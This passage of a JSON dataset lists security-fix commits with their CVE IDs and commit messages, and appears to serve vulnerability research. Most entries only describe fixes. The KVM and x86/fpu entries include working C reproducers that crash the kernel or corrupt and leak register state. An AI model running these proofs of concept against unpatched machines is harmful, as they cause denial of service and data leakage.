    "body": "It is unsafe to pass a password as part of the command line argsbecause it appears in the process info and is recorded in theshell command history.The -p --keycloak-admin-password arg has been replaced with -P--keycloak-admin-password-file which reads the password from a file orstdin if given a hyphen. The now deprecated --keycloak-admin-passwordalso accepted stdin with a hyphen, this was retained for backwardcompatibility during a transition period, it will issue a deprecationwarning. Trying to use --keycloak-admin-password with anything otherthan a hyphen will result in an error and explanation.The man page was updated to include a section on password passing andincludes documention on using the KEYCLOAK_ADMIN_PASSWORD environmentvariable (which was always supported but never documented).The --admin-password command line arg in keycloak_cli.py was alsoupdated in a similar manner and now also includes support forKEYCLOAK_ADMIN_PASSWORD environment variable.",
    "cveIds": [
      "CVE-2017-15112"
    ],
    "cveIdsCount": 1
  },
  "23703d7bc6e2ce453e7f9418bf4f53d0c157f054a722adec57860b133f8bb2d2": {
    "url": "https://github.com/torvalds/linux/commit/df80cd9b28b9ebaa284a41df611dbf3a2d05ca74",
    "title": "sctp: do not peel off an assoc from one netns to another one",
    "body": "Now when peeling off an association to the sock in another netns, alltransports in this assoc are not to be rehashed and keep use the oldkey in hashtable.As a transport uses sk->net as the hash key to insert into hashtable,it would miss removing these transports from hashtable due to the newnetns when closing the sock and all transports are being freeed, thenlater an use-after-free issue could be caused when looking up an asocand dereferencing those transports.This is a very old issue since very beginning, ChunYu found it withsyzkaller fuzz testing with this series: socket$inet6_sctp() bind$inet6() sendto$inet6() unshare(0x40000000) getsockopt$inet_sctp6_SCTP_GET_ASSOC_ID_LIST() getsockopt$inet_sctp6_SCTP_SOCKOPT_PEELOFF()This patch is to block this call when peeling one assoc off from onenetns to another one, so that the netns of all transport would notgo out-sync with the key in hashtable.Note that this patch didn't fix it by rehashing transports, as it'sdifficult to handle the situation when the tuple is already in usein the new netns. Besides, no one would like to peel off one assocto another netns, considering ipaddrs, ifaces, etc. are usuallydifferent.Reported-by: ChunYu Wang <chunwang@redhat.com>Signed-off-by: Xin Long <lucien.xin@gmail.com>Acked-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>Acked-by: Neil Horman <nhorman@tuxdriver.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-15115"
    ],
    "cveIdsCount": 1
  },
  "d433003c97453f8a0e9e378edd49bf4810cd2bf96d95d1a9291aeb225c5d0d8f": {
    "url": "https://github.com/torvalds/linux/commit/94f1bb15bed84ad6c893916b7e7b9db6f1d7eec6",
    "title": "crypto: rng - Remove old low-level rng interface",
    "body": "Now that all rng implementations have switched over to the newinterface, we can remove the old low-level interface.Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>",
    "cveIds": [
      "CVE-2017-15116"
    ],
    "cveIdsCount": 1
  },
  "bc2d6fbc54cace00c80b89c1eb55c3c506c4fc6312c64ff5a7252db45b9f6af1": {
    "url": "https://github.com/torvalds/linux/commit/384632e67e0829deb8015ee6ad916b180049d252",
    "title": "userfaultfd: non-cooperative: fix fork use after free",
    "body": "When reading the event from the uffd, we put it on a temporaryfork_event list to detect if we can still access it after releasing andretaking the event_wqh.lock.If fork aborts and removes the event from the fork_event all is fine aslong as we're still in the userfault read context and fork_event head isstill alive.We've to put the event allocated in the fork kernel stack, back fromfork_event list-head to the event_wqh head, before returning fromuserfaultfd_ctx_read, because the fork_event head lifetime is limited tothe userfaultfd_ctx_read stack lifetime.Forgetting to move the event back to its event_wqh place then results in__remove_wait_queue(&ctx->event_wqh, &ewq->wq); inuserfaultfd_event_wait_completion to remove it from a head that has beenalready freed from the reader stack.This could only happen if resolve_userfault_fork failed (for example ifthere are no file descriptors available to allocate the fork uffd). Ifit succeeded it was put back correctly.Furthermore, after find_userfault_evt receives a fork event, the forkeduserfault context in fork_nctx and uwq->msg.arg.reserved.reserved1 canbe released by the fork thread as soon as the event_wqh.lock isreleased. Taking a reference on the fork_nctx before dropping the lockprevents an use after free in resolve_userfault_fork().If the fork side aborted and it already released everything, we stilltry to succeed resolve_userfault_fork(), if possible.Fixes: 893e26e (\"userfaultfd: non-cooperative: Add fork() event\")Link: http://lkml.kernel.org/r/20170920180413.26713-1-aarcange@redhat.comSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>Reported-by: Mark Rutland <mark.rutland@arm.com>Tested-by: Mark Rutland <mark.rutland@arm.com>Cc: Pavel Emelyanov <xemul@virtuozzo.com>Cc: Mike Rapoport <rppt@linux.vnet.ibm.com>Cc: \"Dr. David Alan Gilbert\" <dgilbert@redhat.com>Cc: Mike Kravetz <mike.kravetz@oracle.com>Cc: <stable@vger.kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-15126"
    ],
    "cveIdsCount": 1
  },
  "c19ef84193a1277224e8d60eb93d7aa7f85bc2d1d6810ddb003cdf3d6581c9f0": {
    "url": "https://github.com/torvalds/linux/commit/1e3921471354244f70fe268586ff94a97a6dd4df",
    "title": "userfaultfd: hugetlbfs: prevent UFFDIO_COPY to fill beyond the end of…",
    "body": "… i_sizeThis oops: kernel BUG at fs/hugetlbfs/inode.c:484! RIP: remove_inode_hugepages+0x3d0/0x410 Call Trace: hugetlbfs_setattr+0xd9/0x130 notify_change+0x292/0x410 do_truncate+0x65/0xa0 do_sys_ftruncate.constprop.3+0x11a/0x180 SyS_ftruncate+0xe/0x10 tracesys+0xd9/0xdewas caused by the lack of i_size check in hugetlb_mcopy_atomic_pte.mmap() can still succeed beyond the end of the i_size after vmtruncatezapped vmas in those ranges, but the faults must not succeed, and thatincludes UFFDIO_COPY.We could differentiate the retval to userland to represent a SIGBUS likea page fault would do (vs SIGSEGV), but it doesn't seem very useful andwe'd need to pick a random retval as there's no meaningful syscallretval that would differentiate from SIGSEGV and SIGBUS, there's just-EFAULT.Link: http://lkml.kernel.org/r/20171016223914.2421-2-aarcange@redhat.comSigned-off-by: Andrea Arcangeli <aarcange@redhat.com>Reviewed-by: Mike Kravetz <mike.kravetz@oracle.com>Cc: Mike Rapoport <rppt@linux.vnet.ibm.com>Cc: \"Dr. David Alan Gilbert\" <dgilbert@redhat.com>Cc: <stable@vger.kernel.org>Signed-off-by: Andrew Morton <akpm@linux-foundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2017-15128"
    ],
    "cveIdsCount": 1
  },
  "8f0a73d0856798cb5a9bfc89c9c6cd43df4c7d219bfd034383cc512967361796": {
    "url": "https://github.com/torvalds/linux/commit/21b5944350052d2583e82dd59b19a9ba94a007f0",
    "title": "net: Fix double free and memory corruption in get_net_ns_by_id()",
    "body": "(I can trivially verify that that idr_remove in cleanup_net happens after the network namespace count has dropped to zero --EWB)Function get_net_ns_by_id() does not check for net::countafter it has found a peer in netns_ids idr.It may dereference a peer, after its count has already beenfinaly decremented. This leads to double free and memorycorruption:put_net(peer) rtnl_lock()atomic_dec_and_test(&peer->count) [count=0] ...__put_net(peer) get_net_ns_by_id(net, id) spin_lock(&cleanup_list_lock) list_add(&net->cleanup_list, &cleanup_list) spin_unlock(&cleanup_list_lock)queue_work() peer = idr_find(&net->netns_ids, id) | get_net(peer) [count=1] | ... | (use after final put) v ... cleanup_net() ... spin_lock(&cleanup_list_lock) ... list_replace_init(&cleanup_list, ..) ... spin_unlock(&cleanup_list_lock) ... ... ... ... put_net(peer) ... atomic_dec_and_test(&peer->count) [count=0] ... spin_lock(&cleanup_list_lock) ... list_add(&net->cleanup_list, &cleanup_list) ... spin_unlock(&cleanup_list_lock) ... queue_work() ... rtnl_unlock() rtnl_lock() ... for_each_net(tmp) { ... id = __peernet2id(tmp, peer) ... spin_lock_irq(&tmp->nsid_lock) ... idr_remove(&tmp->netns_ids, id) ... ... ... net_drop_ns() ...net_free(peer) ... } ... | v cleanup_net() ... (Second free of peer)Also, put_net() on the right cpu may reorder with left's cpulist_replace_init(&cleanup_list, ..), and then cleanup_listwill be corrupted.Since cleanup_net() is executed in worker thread, whileput_net(peer) can happen everywhere, there should beenough time for concurrent get_net_ns_by_id() to pickthe peer up, and the race does not seem to be unlikely.The patch fixes the problem in standard way.(Also, there is possible problem in peernet2id_alloc(), which requirescheck for net::count under nsid_lock and maybe_get_net(peer), butin current stable kernel it's used under rtnl_lock() and it has to besafe. Openswitch begun to use peernet2id_alloc(), and possibly it shouldbe fixed too. While this is not in stable kernel yet, so I'll senda separate message to netdev@ later).Cc: Nicolas Dichtel <nicolas.dichtel@6wind.com>Signed-off-by: Kirill Tkhai <ktkhai@virtuozzo.com>Fixes: 0c7aecd \"netns: add rtnl cmd to add and get peer netns ids\"Reviewed-by: Andrey Ryabinin <aryabinin@virtuozzo.com>Reviewed-by: \"Eric W. Biederman\" <ebiederm@xmission.com>Signed-off-by: Eric W. Biederman <ebiederm@xmission.com>Reviewed-by: Eric Dumazet <edumazet@google.com>Acked-by: Nicolas Dichtel <nicolas.dichtel@6wind.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2017-15129"
    ],
    "cveIdsCount": 1
  },
  "cbd52659f1507e9e12ddddcd8dd975fcc993d39a37d18b0a2ba7154d52e5f9ad": {
    "url": "https://github.com/Cacti/cacti/commit/93f661d8adcfa6618b11522cdab30e97bada33fd",
    "title": "XSS fix (#1017)",
    "body": "Fix for issue #1010",
    "cveIds": [
      "CVE-2017-15194"
    ],
    "cveIdsCount": 1
  },
  "496d36576d86d5fdcc044c4a114a20836fa62f89d5f00af79d5d0b165d6034bc": {
    "url": "https://github.com/MISP/MISP/commit/ca6f4a783a6ba65532dc8767446bda44773ec627",
    "title": "fix: Fix to a potential reflected XSS on the quickDelete",
    "body": "- low impact, XSS required user confirmation of malicious payload- as reported by Or Hanuka (PALANTIR)",
    "cveIds": [
      "CVE-2017-15216"
    ],
    "cveIdsCount": 1
  },
  "2e18691141c168f5af3717233bc03a416931806e8537db6c93ca1b01d7dc315f": {
    "url": "https://github.com/torvalds/linux/commit/71105998845fb012937332fe2e806d443c09e026",
    "title": "ALSA: seq: Fix use-after-free at creating a port",
    "body": "There is a potential race window opened at creating and deleting aport via ioctl, as spotted by fuzzing. snd_seq_create_port() createsa port object and returns its pointer, but it doesn't take therefcount, thus it can be deleted immediately by another thread.Meanwhile, snd_seq_ioctl_create_port() still calls the functionsnd_seq_system_client_ev_port_start() with the created port objectthat is being deleted, and this triggers use-after-free like: BUG: KASAN: use-after-free in snd_seq_ioctl_create_port+0x504/0x630 [snd_seq] at addr ffff8801f2241cb1 ============================================================================= BUG kmalloc-512 (Tainted: G B ): kasan: bad access detected ----------------------------------------------------------------------------- INFO: Allocated in snd_seq_create_port+0x94/0x9b0 [snd_seq] age=1 cpu=3 pid=4511 ___slab_alloc+0x425/0x460 __slab_alloc+0x20/0x40 kmem_cache_alloc_trace+0x150/0x190snd_seq_create_port+0x94/0x9b0 [snd_seq]snd_seq_ioctl_create_port+0xd1/0x630 [snd_seq] snd_seq_do_ioctl+0x11c/0x190 [snd_seq] snd_seq_ioctl+0x40/0x80 [snd_seq] do_vfs_ioctl+0x54b/0xda0 SyS_ioctl+0x79/0x90 entry_SYSCALL_64_fastpath+0x16/0x75 INFO: Freed in port_delete+0x136/0x1a0 [snd_seq] age=1 cpu=2 pid=4717 __slab_free+0x204/0x310 kfree+0x15f/0x180 port_delete+0x136/0x1a0 [snd_seq] snd_seq_delete_port+0x235/0x350 [snd_seq] snd_seq_ioctl_delete_port+0xc8/0x180 [snd_seq] snd_seq_do_ioctl+0x11c/0x190 [snd_seq] snd_seq_ioctl+0x40/0x80 [snd_seq] do_vfs_ioctl+0x54b/0xda0 SyS_ioctl+0x79/0x90 entry_SYSCALL_64_fastpath+0x16/0x75 Call Trace: [<ffffffff81b03781>] dump_stack+0x63/0x82 [<ffffffff81531b3b>] print_trailer+0xfb/0x160 [<ffffffff81536db4>] object_err+0x34/0x40 [<ffffffff815392d3>] kasan_report.part.2+0x223/0x520 [<ffffffffa07aadf4>] ? snd_seq_ioctl_create_port+0x504/0x630 [snd_seq] [<ffffffff815395fe>] __asan_report_load1_noabort+0x2e/0x30 [<ffffffffa07aadf4>] snd_seq_ioctl_create_port+0x504/0x630 [snd_seq] [<ffffffffa07aa8f0>] ? snd_seq_ioctl_delete_port+0x180/0x180 [snd_seq] [<ffffffff8136be50>] ? taskstats_exit+0xbc0/0xbc0 [<ffffffffa07abc5c>] snd_seq_do_ioctl+0x11c/0x190 [snd_seq] [<ffffffffa07abd10>] snd_seq_ioctl+0x40/0x80 [snd_seq] [<ffffffff8136d433>] ? acct_account_cputime+0x63/0x80 [<ffffffff815b515b>] do_vfs_ioctl+0x54b/0xda0 .....We may fix this in a few different ways, and in this patch, it's fixedsimply by taking the refcount properly at snd_seq_create_port() andletting the caller unref the object after use. Also, there is anotherpotential use-after-free by sprintf() call in snd_seq_create_port(),and this is moved inside the lock.This fix covers CVE-2017-15265.Reported-and-tested-by: Michael23 Yu <ycqzsy@gmail.com>Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>Cc: <stable@vger.kernel.org>Signed-off-by: Takashi Iwai <tiwai@suse.de>",
    "cveIds": [
      "CVE-2017-15265"
    ],
    "cveIdsCount": 1
  },
  "01eec046bfcdf34a8ae4847f798a442740ae2bc2eec07d766c8aaea267d8cc21": {
    "url": "https://github.com/torvalds/linux/commit/5649645d725c73df4302428ee4e02c869248b4c5",
    "title": "KEYS: fix dereferencing NULL payload with nonzero length",
    "body": "sys_add_key() and the KEYCTL_UPDATE operation of sys_keyctl() allowed aNULL payload with nonzero length to be passed to the key type's->preparse(), ->instantiate(), and/or ->update() methods. Various keytypes including asymmetric, cifs.idmap, cifs.spnego, and pkcs7_test didnot handle this case, allowing an unprivileged user to trivially cause aNULL pointer dereference (kernel oops) if one of these key types waspresent. Fix it by doing the copy_from_user() when 'plen' is nonzerorather than when '_payload' is non-NULL, causing the syscall to failwith EFAULT as expected when an invalid buffer is specified.Cc: stable@vger.kernel.org # 2.6.10+Signed-off-by: Eric Biggers <ebiggers@google.com>Signed-off-by: David Howells <dhowells@redhat.com>Signed-off-by: James Morris <james.l.morris@oracle.com>",
    "cveIds": [
      "CVE-2017-15274"
    ],
    "cveIdsCount": 1
  },
  "2e104269ba9349e5bed3d4c38eb025c5a806fcdf3caa0e8e87cfe6b1c700f282": {
    "url": "https://github.com/nilsteampassnet/TeamPass/commit/f5a765381f051fe624386866ddb1f6b5e7eb929b",
    "title": "2.1.27",
    "body": "Fixed \"PW copy to clipboard\" log unconsistency in specific caseImproved the possibility to define the access level on Roles when creating new folder",
    "cveIds": [
      "CVE-2017-15278"
    ],
    "cveIdsCount": 1
  },
  "4d415a31792d029c73928d0bfad6d27631a5b19bd0ff4bb1e313279a215825c5": {
    "url": "https://github.com/umbraco/Umbraco-CMS/commit/fe2b86b681455ac975b294652064b2718d4e2ba2",
    "title": "Html encode nodenames to prevent XSS attacks. Fixes U4-10497 XSS Vuln…",
    "body": "…erability in page name.",
    "cveIds": [
      "CVE-2017-15279"
    ],
    "cveIdsCount": 1
  },
  "1500a3f11d07c76e3430c73d2f1358d83428e90040c0dbc36ec35e1f41e21734": {
    "url": "https://github.com/octobercms/library/commit/3bbbbf3da469f457881b5af902eb0b89b95189a2",
    "title": "Remove SVG from image types",
    "body": "SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elementsRefs: https://html5sec.org/#svgOriginal report by: Ishaq Mohammed",
    "cveIds": [
      "CVE-2017-15284"
    ],
    "cveIdsCount": 1
  },
  "07daa121934444d3b878dbb159119f2fc3d21ec51719ff456a31cddf8e072146": {
    "url": "https://github.com/torvalds/linux/commit/ac64115a66c18c01745bbd3c47a36b124e5fd8c0",
    "title": "KVM: PPC: Fix oops when checking KVM_CAP_PPC_HTM",
    "body": "The following program causes a kernel oops:#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sys/ioctl.h>#include <linux/kvm.h>main(){ int fd = open(\"/dev/kvm\", O_RDWR); ioctl(fd, KVM_CHECK_EXTENSION, KVM_CAP_PPC_HTM);}This happens because when using the global KVM fd withKVM_CHECK_EXTENSION, kvm_vm_ioctl_check_extension() getscalled with a NULL kvm argument, which gets dereferencedin is_kvmppc_hv_enabled(). Spotted while reading the code.Let's use the hv_enabled fallback variable, like everywhereelse in this function.Fixes: 23528bb (\"KVM: PPC: Introduce KVM_CAP_PPC_HTM\")Cc: stable@vger.kernel.org # v4.7+Signed-off-by: Greg Kurz <groug@kaod.org>Reviewed-by: David Gibson <david@gibson.dropbear.id.au>Reviewed-by: Thomas Huth <thuth@redhat.com>Signed-off-by: Paul Mackerras <paulus@ozlabs.org>",
    "cveIds": [
      "CVE-2017-15306"
    ],
    "cveIdsCount": 1
  },
  "dc533f2b18aa37933314096ad779a59f3f4ff916d8d17aec0b4b9d5897840516": {
    "url": "https://github.com/bacula-web/bacula-web/commit/90d4c44a0dd0d65c6fb3ab2417b83d700c8413ae",
    "title": "Ensure provided period is a valid integer and a known value",
    "body": "- if provided period is not an integer or a known value, we raise an exception",
    "cveIds": [
      "CVE-2017-15367"
    ],
    "cveIdsCount": 1
  },
  "7f6bebc7a08437a4bbf42013732c7edd603e8dfca57d71521f6ecf286e3e13b3": {
    "url": "https://github.com/torvalds/linux/commit/814fb7bb7db5433757d76f4c4502c96fc53b0b5e",
    "title": "x86/fpu: Don't let userspace set bogus xcomp_bv",
    "body": "On x86, userspace can use the ptrace() or rt_sigreturn() system calls toset a task's extended state (xstate) or \"FPU\" registers. ptrace() canset them for another task using the PTRACE_SETREGSET request withNT_X86_XSTATE, while rt_sigreturn() can set them for the current task.In either case, registers can be set to any value, but the kernelassumes that the XSAVE area itself remains valid in the sense that theCPU can restore it.However, in the case where the kernel is using the uncompacted xstateformat (which it does whenever the XSAVES instruction is unavailable),it was possible for userspace to set the xcomp_bv field in thexstate_header to an arbitrary value. However, all bits in that fieldare reserved in the uncompacted case, so when switching to a task withnonzero xcomp_bv, the XRSTOR instruction failed with a #GP fault. Thiscaused the WARN_ON_FPU(err) in copy_kernel_to_xregs() to be hit. Inaddition, since the error is otherwise ignored, the FPU registers fromthe task previously executing on the CPU were leaked.Fix the bug by checking that the user-supplied value of xcomp_bv is 0 inthe uncompacted case, and returning an error otherwise.The reason for validating xcomp_bv rather than simply overwriting itwith 0 is that we want userspace to see an error if it (incorrectly)provides an XSAVE area in compacted format rather than in uncompactedformat.Note that as before, in case of error we clear the task's FPU state.This is perhaps non-ideal, especially for PTRACE_SETREGSET; it might bebetter to return an error before changing anything. But it seems the\"clear on error\" behavior is fine for now, and it's a little tricky todo otherwise because it would mean we couldn't simply copy the fulluserspace state into kernel memory in one __copy_from_user().This bug was found by syzkaller, which hit the above-mentionedWARN_ON_FPU(): WARNING: CPU: 1 PID: 0 at ./arch/x86/include/asm/fpu/internal.h:373 __switch_to+0x5b5/0x5d0 CPU: 1 PID: 0 Comm: swapper/1 Not tainted 4.13.0 #453 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011 task: ffff9ba2bc8e42c0 task.stack: ffffa78cc036c000 RIP: 0010:__switch_to+0x5b5/0x5d0 RSP: 0000:ffffa78cc08bbb88 EFLAGS: 00010082 RAX: 00000000fffffffe RBX: ffff9ba2b8bf2180 RCX: 00000000c0000100 RDX: 00000000ffffffff RSI: 000000005cb10700 RDI: ffff9ba2b8bf36c0 RBP: ffffa78cc08bbbd0 R08: 00000000929fdf46 R09: 0000000000000001 R10: 0000000000000000 R11: 0000000000000000 R12: ffff9ba2bc8e42c0 R13: 0000000000000000 R14: ffff9ba2b8bf3680 R15: ffff9ba2bf5d7b40 FS: 00007f7e5cb10700(0000) GS:ffff9ba2bf400000(0000) knlGS:0000000000000000 CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 00000000004005cc CR3: 0000000079fd5000 CR4: 00000000001406e0 Call Trace: Code: 84 00 00 00 00 00 e9 11 fd ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 e7 fa ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 c2 fa ff ff <0f> ff 66 0f 1f 84 00 00 00 00 00 e9 d4 fc ff ff 66 66 2e 0f 1fHere is a C reproducer. The expected behavior is that the program spinforever with no output. However, on a buggy kernel running on aprocessor with the \"xsave\" feature but without the \"xsaves\" feature(e.g. Sandy Bridge through Broadwell for Intel), within a second or twothe program reports that the xmm registers were corrupted, i.e. were notrestored correctly. With CONFIG_X86_DEBUG_FPU=y it also hits the abovekernel warning. #define _GNU_SOURCE #include <stdbool.h> #include <inttypes.h> #include <linux/elf.h> #include <stdio.h> #include <sys/ptrace.h> #include <sys/uio.h> #include <sys/wait.h> #include <unistd.h> int main(void) { int pid = fork(); uint64_t xstate[512]; struct iovec iov = { .iov_base = xstate, .iov_len = sizeof(xstate) }; if (pid == 0) { bool tracee = true; for (int i = 0; i < sysconf(_SC_NPROCESSORS_ONLN) && tracee; i++) tracee = (fork() != 0); uint32_t xmm0[4] = { [0 ... 3] = tracee ? 0x00000000 : 0xDEADBEEF }; asm volatile(\" movdqu %0, %%xmm0\\n\" \" mov %0, %%rbx\\n\" \"1: movdqu %%xmm0, %0\\n\" \" mov %0, %%rax\\n\" \" cmp %%rax, %%rbx\\n\" \" je 1b\\n\" : \"+m\" (xmm0) : : \"rax\", \"rbx\", \"xmm0\"); printf(\"BUG: xmm registers corrupted! tracee=%d, xmm0=%08X%08X%08X%08X\\n\", tracee, xmm0[0], xmm0[1], xmm0[2], xmm0[3]); } else { usleep(100000); ptrace(PTRACE_ATTACH, pid, 0, 0); wait(NULL); ptrace(PTRACE_GETREGSET, pid, NT_X86_XSTATE, &iov); xstate[65] = -1; ptrace(PTRACE_SETREGSET, pid, NT_X86_XSTATE, &iov); ptrace(PTRACE_CONT, pid, 0, 0); wait(NULL); } return 1; }Note: the program only tests for the bug using the ptrace() system call.The bug can also be reproduced using the rt_sigreturn() system call, butonly when called from a 32-bit program, since for 64-bit programs thekernel restores the FPU state from the signal frame by doing XRSTORdirectly from userspace memory (with proper error checking).Reported-by: Dmitry Vyukov <dvyukov@google.com>Signed-off-by: Eric Biggers <ebiggers@google.com>Reviewed-by: Kees Cook <keescook@chromium.org>Reviewed-by: Rik van Riel <riel@redhat.com>Acked-by: Dave Hansen <dave.hansen@linux.intel.com>Cc: <stable@vger.kernel.org> [v3.17+]Cc: Andrew Morton <akpm@linux-foundation.org>Cc: Andy Lutomirski <luto@amacapital.net>Cc: Andy Lutomirski <luto@kernel.org>Cc: Borislav Petkov <bp@alien8.de>Cc: Eric Biggers <ebiggers3@gmail.com>Cc: Fenghua Yu <fenghua.yu@intel.com>Cc: Kevin Hao <haokexin@gmail.com>Cc: Linus Torvalds <torvalds@linux-foundation.org>Cc: Michael Halcrow <mhalcrow@google.com>Cc: Oleg Nesterov <oleg@redhat.com>Cc: Peter Zijlstra <peterz@infradead.org>Cc: Thomas Gleixner <tglx@linutronix.de>Cc: Wanpeng Li <wanpeng.li@hotmail.com>Cc: Yu-cheng Yu <yu-cheng.yu@intel.com>Cc: kernel-hardening@lists.openwall.comFixes: 0b29643 (\"x86/xsaves: Change compacted format xsave area header\")Link: http://lkml.kernel.org/r/20170922174156.16780-2-ebiggers3@gmail.comLink: http://lkml.kernel.org/r/20170923130016.21448-25-mingo@kernel.orgSigned-off-by: Ingo Molnar <mingo@kernel.org>",
    "cveIds": [
      "CVE-2017-15537"
    ],
    "cveIdsCount": 1
  },
  "6be912891eb37844b389995a71ea4ba861c67f79faa1025adc0f364bff434177": {
    "url": "https://github.com/redmine/redmine/commit/94f7cfbf990028348b9262578acbc53a94fce448",
    "title": "Ensure that values of multi-value fields are HTML-escaped in issue hi…",
    "body": "…story (#27186).Patch by Holger Just.git-svn-id: http://svn.redmine.org/redmine/trunk@16985 e93f8b46-1217-0410-a6f0-8f06a7374b81",
    "cveIds": [
      "CVE-2017-15568"
    ],
    "cveIdsCount": 1
  },
  "8c0a025664660db5edf398ce45599fedf966514abeb273fe164aafb77176e839": {
    "url": "https://github.com/redmine/redmine/commit/56c8ee0440d8555aa7822d947ba9091c8a791508",
    "title": "Ensure that values of multi-value fields are HTML-escaped in issue li…",
    "body": "…st (#27186).Patch by Holger Just.git-svn-id: http://svn.redmine.org/redmine/trunk@16984 e93f8b46-1217-0410-a6f0-8f06a7374b81",
    "cveIds": [
      "CVE-2017-15569"
    ],
    "cveIdsCount": 1
  },
  "87b0636df551c7c8934f453d433f32f5188eec997032bfa993e0a54bf8686874": {
    "url": "https://github.com/redmine/redmine/commit/1a0976417975a128b0a932ba1552c37e9414953b",
    "title": "Don't use raw output in timelog (#27186).",
    "body": "git-svn-id: http://svn.redmine.org/redmine/trunk@16983 e93f8b46-1217-0410-a6f0-8f06a7374b81",
    "cveIds": [
      "CVE-2017-15570"
    ],
    "cveIdsCount": 1
  },
  "b5793c9beb4cdf5d6c985ebda661a9ca4edb3623a282fb373beb47439c422d0e": {
    "url": "https://github.com/redmine/redmine/commit/273dd9cb3bcfb1e0a0b90570b3b34eafa07d67aa",
    "title": "Don't use raw output (#27186).",
    "body": "git-svn-id: http://svn.redmine.org/redmine/trunk@16971 e93f8b46-1217-0410-a6f0-8f06a7374b81",
    "cveIds": [
      "CVE-2017-15571"
    ],
    "cveIdsCount": 1
  },
  "771402b6b48a03787b36f94b64aa602253c1cc884a276e30b1179618750d9826": {
    "url": "https://github.com/FFmpeg/FFmpeg/commit/d893253fcd93d11258e98857175e93be7d158708",
    "title": "avcodec/ffv1dec: Fix out of array read in slice counting",
    "body": "Fixes: test-201710.mp4Found-by: 连一汉 <lianyihan@360.cn> and Zhibin HuSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>(cherry picked from commit c20f4fc)Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>",
    "cveIds": [
      "CVE-2017-15672"
    ],
    "cveIdsCount": 1
  },
  "135efa295cbb8dc0e4ebb296b133a41e5e38a9e4b38a79da0308b1911f8c7cf2": {
    "url": "https://github.com/faiyazalam/WordPress-plugin-user-login-history/commit/519341a7dece59e2c589b908a636e6cf12a61741",
    "title": "error log and xss and some minor improvents",
    "body": "error log, xss, cancel button on frontend listing page, chrome OS and some minor improvements",
    "cveIds": [
      "CVE-2017-15867"
    ],
    "cveIdsCount": 1
  },
  "47537e555a3a04b1e15b335de4f223f3fa18c593534c073b8a51ea3f33291beb": {
    "url": "https://github.com/torvalds/linux/commit/71bb99a02b32b4cc4265118e85f6035ca72923f0",
    "title": "Bluetooth: bnep: bnep_add_connection() should verify that it's dealin…",
    "body": "…g with l2cap socketsame story as cmtpSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>Signed-off-by: Marcel Holtmann <marcel@holtmann.org>",
    "cveIds": [
      "CVE-2017-15868"
    ],
    "cveIdsCount": 1
  },
  "d470ee856265d173c7a9a7e3f7d901c0168693a12a7c0a927b69741185dbc3d4": {
    "url": "https://github.com/slackero/phpwcms/commit/90ee94a474b37919161f8112f9e36c53ad70492f",
    "title": "Fix stored XSS as reported by Chirag Savla",
    "body": "It's a pretty old problem – a beginner's mistake in programming. Damn. As far I can see no huge problem because of CSRF and you need to be logged in to the backend. But it wasn't well done from my side.If you have older installations check the html() function which were added. Older releases do not know html() – use html_specialchars() instead.",
    "cveIds": [
      "CVE-2017-15872"
    ],
    "cveIdsCount": 1
  },
  "f560bd6e2947cbf023cecdda631c70d5dfa156c1387095c985c4d5ac4e664d73": {
    "url": "https://github.com/slackero/phpwcms/commit/62c7c4a7a7de5effa0a82c89e77e53795a82e11d",
    "title": "Fix stored XSS as reported by Chirag Savla",
    "body": "It's a pretty old problem – a beginner's mistake in programming. Damn. As far I can see no huge problem because of CSRF and you need to be logged in to the backend. But it wasn't well done from my side.If you have older installations check the html() function which were added. Older releases do not know html() – use html_specialchars() instead.",
    "cveIds": [
      "CVE-2017-15872"
    ],
    "cveIdsCount": 1
  },
  "f467a809598024c1be76dcc856232d32a97024cd2eec853a8ad6d7e820f5505d": {
    "url": "https://github.com/torvalds/linux/commit/363b02dab09b3226f3bd1420dad9c72b79a42a76",
    "title": "KEYS: Fix race between updating and finding a negative key",
    "body": "Consolidate KEY_FLAG_INSTANTIATED, KEY_FLAG_NEGATIVE and the rejectionerror into one field such that: (1) The instantiation state can be modified/read atomically. (2) The error can be accessed atomically with the state. (3) The error isn't stored unioned with the payload pointers.This deals with the problem that the state is spread over three differentobjects (two bits and a separate variable) and reading or updating thematomically isn't practical, given that not only can uninstantiated keyschange into instantiated or rejected keys, but rejected keys can also turninto instantiated keys - and someone accessing the key might not be usingany locking.The main side effect of this problem is that what was held in the payloadmay change, depending on the state. For instance, you might observe thekey to be in the rejected state. You then read the cached error, but ifthe key semaphore wasn't locked, the key might've become instantiatedbetween the two reads - and you might now have something in hand that isn'tactually an error code.The state is now KEY_IS_UNINSTANTIATED, KEY_IS_POSITIVE or a negative errorcode if the key is negatively instantiated. The key_is_instantiated()function is replaced with key_is_positive() to avoid confusion as negativekeys are also 'instantiated'.Additionally, barriering is included: (1) Order payload-set before state-set during instantiation. (2) Order state-read before payload-read when using the key.Further separate barriering is necessary if RCU is being used to access thepayload content after reading the payload pointers.Fixes: 146aa8b (\"KEYS: Merge the type-specific data with the payload data\")Cc: stable@vger.kernel.org # v4.4+Reported-by: Eric Biggers <ebiggers@google.com>Signed-off-by: David Howells <dhowells@redhat.com>Reviewed-by: Eric Biggers <ebiggers@google.com>",
    "cveIds": [
      "CVE-2017-15951"
    ],
    "cveIdsCount": 1
  },
  "33ab318e65968481c315a982ea4893d467fa75e42b493b3d768e1ff64a95ce75": {
